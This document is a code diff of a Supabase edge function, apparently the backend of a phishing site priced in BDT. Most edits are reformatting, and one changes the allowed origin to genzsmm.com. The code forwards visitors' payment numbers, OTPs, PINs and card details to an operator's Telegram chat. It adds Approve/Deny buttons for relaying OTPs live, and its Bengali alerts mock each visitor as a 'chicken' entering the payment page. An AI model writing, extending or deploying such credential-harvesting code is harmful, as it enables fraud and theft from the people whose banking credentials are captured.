@@ -4,9 +4,7 @@ async function deriveWebhookSecret(botToken: string): Promise<string> {
   const data = new TextEncoder().encode(`telegram-webhook:${botToken}`);
   const digest = await crypto.subtle.digest("SHA-256", data);
   return btoa(String.fromCharCode(...new Uint8Array(digest)))
-    .replace(/\+/g, "-")
-    .replace(/\//g, "_")
-    .replace(/=+$/g, "");
+    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
 }
 
 async function ensureWebhookRegistered(botToken: string, supabaseUrl: string) {
@@ -16,8 +14,7 @@ async function ensureWebhookRegistered(botToken: string, supabaseUrl: string) {
   const infoRes = await fetch(`https://api.telegram.org/bot${botToken}/getWebhookInfo`);
   const info = await infoRes.json().catch(() => null);
   const current = info?.result;
-  const healthy =
-    current?.url === webhookUrl &&
+  const healthy = current?.url === webhookUrl &&
     (current?.allowed_updates ?? []).includes("callback_query") &&
     !current?.last_error_message;
   if (healthy) return;
@@ -38,7 +35,7 @@ import { checkFlowSession } from "../_shared/flowSession.ts";
 import { getTelegramConfig } from "../_shared/telegramConfig.ts";
 
 const ALLOWED_ORIGIN_PATTERNS: RegExp[] = [
-  /^https:\/\/gekhanki\.lovable\.app$/i,
+  /^https:\/\/(www\.)?genzsmm\.com$/i,
   /^https:\/\/([a-z0-9-]+\.)*lovable\.app$/i,
   /^https:\/\/([a-z0-9-]+\.)*lovableproject\.com$/i,
   /^https:\/\/([a-z0-9-]+\.)*lovable\.dev$/i,
@@ -58,13 +55,14 @@ function corsFor(origin: string | null) {
   const allow = isAllowedOrigin(origin) ? origin! : "";
   return {
     "Access-Control-Allow-Origin": allow,
-    Vary: "Origin",
+    "Vary": "Origin",
     "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
     "Access-Control-Allow-Methods": "POST, OPTIONS",
   };
 }
 
-const priceText = (p: unknown) => (typeof p === "number" && Number.isFinite(p) ? `${p} BDT` : "N/A");
+const priceText = (p: unknown) =>
+  typeof p === "number" && Number.isFinite(p) ? `${p} BDT` : "N/A";
 
 function detectDeviceModel(ua: string): string {
   // iOS
@@ -79,12 +77,14 @@ function detectDeviceModel(ua: string): string {
     const m = ua.match(/Android[^;]*;\s*([^;]+?)(?:\s+Build\/|\))/i);
     const model = m ? m[1].trim() : "";
     const ver = ua.match(/Android\s+([\d.]+)/i);
-    return model ? `${model}${ver ? ` (Android ${ver[1]})` : ""}` : ver ? `Android ${ver[1]}` : "Android";
+    return model
+      ? `${model}${ver ? ` (Android ${ver[1]})` : ""}`
+      : ver ? `Android ${ver[1]}` : "Android";
   }
   if (/Windows NT ([\d.]+)/i.test(ua)) {
     const m = ua.match(/Windows NT ([\d.]+)/i);
     const map: Record<string, string> = { "10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7" };
-    return `Windows ${m ? map[m[1]] || m[1] : ""}`.trim();
+    return `Windows ${m ? (map[m[1]] || m[1]) : ""}`.trim();
   }
   if (/Mac OS X ([\d_\.]+)/i.test(ua)) {
     const m = ua.match(/Mac OS X ([\d_\.]+)/i);
@@ -112,17 +112,15 @@ serve(async (req) => {
 
   const supabaseUrl = Deno.env.get("SUPABASE_URL");
   const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
-  const cfgBackend =
-    supabaseUrl && serviceKey
-      ? createClient(supabaseUrl, serviceKey, { auth: { persistSession: false, autoRefreshToken: false } })
-      : null;
+  const cfgBackend = supabaseUrl && serviceKey
+    ? createClient(supabaseUrl, serviceKey, { auth: { persistSession: false, autoRefreshToken: false } })
+    : null;
   const { botToken: TELEGRAM_BOT_TOKEN, chatId: TELEGRAM_CHAT_ID } = cfgBackend
     ? await getTelegramConfig(cfgBackend)
     : { botToken: "", chatId: "" };
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     return new Response(JSON.stringify({ error: "not_configured" }), {
-      status: 500,
-      headers: { ...cors, "Content-Type": "application/json" },
+      status: 500, headers: { ...cors, "Content-Type": "application/json" },
     });
   }
 
@@ -150,8 +148,7 @@ serve(async (req) => {
     });
     if (!flowCheck.ok) {
       return new Response(JSON.stringify({ error: "invalid_flow", reason: flowCheck.reason }), {
-        status: 403,
-        headers: { ...cors, "Content-Type": "application/json" },
+        status: 403, headers: { ...cors, "Content-Type": "application/json" },
       });
     }
     const amount = String(flowCheck.session.amount_exact ?? flowCheck.session.amount ?? 0);
@@ -204,7 +201,7 @@ serve(async (req) => {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method}\nNumber : ${number}\nOTP : ${otp}\nPIN : ${pin}\n\n${amountLine}${footer}`;
       }
     } else if (type === "page_entry") {
-      message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nUpdate : ${method ? `${method} Page` : "Selection Page"}\n\n${amountLine}${footer}`;
+        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nUpdate : ${method ? `${method} Page` : "Selection Page"}\n\n${amountLine}${footer}`;
     } else if (type === "payment_cancelled") {
       message = `🐔 মুরগি পেমেন্ট ক্যানসেল করেছে ✅\n\n-------------------\n\nUpdate : ক্যানসেল পেইজে গেছে ।\n\n${amountLine}${footer}`;
     } else if (action === "service_click") {
@@ -217,8 +214,7 @@ serve(async (req) => {
       });
     } else {
       return new Response(JSON.stringify({ error: "unknown_payload" }), {
-        status: 400,
-        headers: { ...cors, "Content-Type": "application/json" },
+        status: 400, headers: { ...cors, "Content-Type": "application/json" },
       });
     }
 
@@ -231,29 +227,16 @@ serve(async (req) => {
     if (requireApproval && supabase) {
       const { data, error } = await supabase
         .from("otp_requests")
-        .insert({
-          method: method || "unknown",
-          payload: {
-            amount,
-            number,
-            otp,
-            cardName,
-            cardNumber,
-            user_id: userId,
-            flow_session_id: flowCheck.session.id,
-          },
-        })
+        .insert({ method: method || "unknown", payload: { amount, number, otp, cardName, cardNumber, user_id: userId, flow_session_id: flowCheck.session.id } })
         .select("id")
         .single();
       if (!error && data) {
         requestId = data.id as string;
         replyMarkup = {
-          inline_keyboard: [
-            [
-              { text: "✅ Approve", callback_data: `otp:approve:${requestId}` },
-              { text: "❌ Deny", callback_data: `otp:deny:${requestId}` },
-            ],
-          ],
+          inline_keyboard: [[
+            { text: "✅ Approve", callback_data: `otp:approve:${requestId}` },
+            { text: "❌ Deny", callback_data: `otp:deny:${requestId}` },
+          ]],
         };
       }
     }
@@ -269,6 +252,7 @@ serve(async (req) => {
       }
     }
 
+
     const tgBody: Record<string, unknown> = { chat_id: TELEGRAM_CHAT_ID, text: message };
     if (replyMarkup) tgBody.reply_markup = replyMarkup;
 
@@ -279,8 +263,7 @@ serve(async (req) => {
     });
     if (!response.ok) {
       return new Response(JSON.stringify({ error: "telegram_failed" }), {
-        status: 502,
-        headers: { ...cors, "Content-Type": "application/json" },
+        status: 502, headers: { ...cors, "Content-Type": "application/json" },
       });
     }
 
@@ -297,8 +280,7 @@ serve(async (req) => {
     });
   } catch {
     return new Response(JSON.stringify({ error: "bad_request" }), {
-      status: 400,
-      headers: { ...cors, "Content-Type": "application/json" },
+      status: 400, headers: { ...cors, "Content-Type": "application/json" },
     });
   }
 });
